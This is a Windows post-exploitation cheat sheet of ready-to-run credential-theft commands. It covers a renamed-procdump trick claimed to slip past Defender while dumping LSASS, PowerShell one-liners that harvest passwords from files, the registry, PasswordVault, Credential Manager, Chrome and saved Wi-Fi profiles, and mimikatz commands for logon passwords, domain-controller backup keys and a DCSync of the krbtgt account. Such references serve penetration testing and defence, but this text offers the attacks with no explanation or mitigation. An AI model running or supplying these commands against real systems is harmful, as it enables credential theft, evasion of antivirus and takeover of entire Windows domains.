Procdump

	rename procdump.exe to dump64.exe 
	place it in the "C:\Program Files (x86)\Microsoft Visual Studio\*" folder
	bypasses Defender and dumps LSASS

PowerShell

	Find interesting files
	gci c:\ -Include *pass*.txt, *pass*.xml, *pass*.ini, *pass*.xlsx, *cred*, *vnc*, *.config, *accounts*, -File -Recurse -EA SilentlyContinue

	Find credentials in sysrep/unattend files
	gci c:\ -Include *sysrep.inf, *sysrep.xml, *sysrep.txt, *unattended.xml, *unattend.xml, *unattend.txt -File -Recurse -EA SilentlyContinue

	Find config files containing passwords
	gci c:\ -Include *.txt,*.xml,*.config,*.conf,*.cfg,*.ini -File -Recurse -EA SilentlyContinue | Select-String -Pattern "password"

	Find database credentials in configuration files
	gci c:\ -Include *.config,*.conf,*.xml -File -Recurse -EA SilentlyContinue | Select-String -Pattern "connectionString"

	Locate web server configuration files
	gci c:\ -Include web.config,applicationHost.config,php.ini,httpd.conf,httpd-xampp.conf,my.ini,my.cnf -File -Recurse -EA SilentlyContinue

	Get stored passwords from Windows PasswordVault
	[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];(New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword();$_ }

	Get stored passwords from Windows Credential Manager
	Get-StoredCredential | % { write-host -NoNewLine $_.username; write-host -NoNewLine ":" ; $p = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($_.password) ; [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($p); }

	Dump passwords from Google Chrome browser
	[System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($datarow.password_value,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser))

	Get stored Wi-Fi passwords from Wireless Profiles (need admin)
	(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize

	Search for SNMP community string in registry
	gci HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse -EA SilentlyContinue

	Search for string pattern in registry
	$pattern = "password"
	$hives = "HKEY_CLASSES_ROOT","HKEY_CURRENT_USER","HKEY_LOCAL_MACHINE","HKEY_USERS","HKEY_CURRENT_CONFIG"

	# Search in registry keys
	foreach ($r in $hives) { gci "registry::${r}\" -rec -ea SilentlyContinue | sls "$pattern" }

	# Search in registry values
	foreach ($r in $hives) { gci "registry::${r}\" -rec -ea SilentlyContinue | % { if((gp $_.PsPath -ea SilentlyContinue) -match "$pattern") { $_.PsPath; $_ | out-string -stream | sls "$pattern" }}}


mimikatz

	credentials on compromised machine
		mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" >> <output_file>

	Domain Controller master key
		can decrypt all secrets on domain machines

		mimikatz.exe "privilege::debug" "lsadump::backupkeys /system:<DC_FQDN> /export" "exit"

	malicious replication to remotely harvest a credential
		mimikatz.exe "lsadump::dcsync /domain:<DC_FQDN> /user:krbtgt" "exit" >> <output_file>

	
